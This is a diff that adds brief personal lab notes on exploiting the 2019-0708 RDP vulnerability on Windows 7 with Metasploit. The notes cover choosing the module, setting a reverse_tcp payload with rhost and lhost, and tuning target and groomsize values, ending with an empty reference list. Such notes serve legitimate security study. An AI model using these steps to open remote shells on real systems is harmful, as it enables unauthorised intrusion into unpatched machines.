@@ -1,0 +1,19 @@
+Environment:
+- (v)victim: windows 7 sp1
+- (A)attacker: kali linux
+
+Steps:
+
+1- run msfconsole and search for 2019_0708
+2- use <returned path>
+4- set payload 15 (reverse_tcp)
+3- set rhost,lhost & run
+4- if no session was created, set target=2 or 4,groomsize=50. if failed
+   still,may work with other values of target and groomsize
+   (find out what exectly are target and groomsize, probably memory 
+   offset and address related parameters. related:NonPagedPool)
+
+#TODO: make my own script to exploit this. Do more research.
+
+Reference links:
+
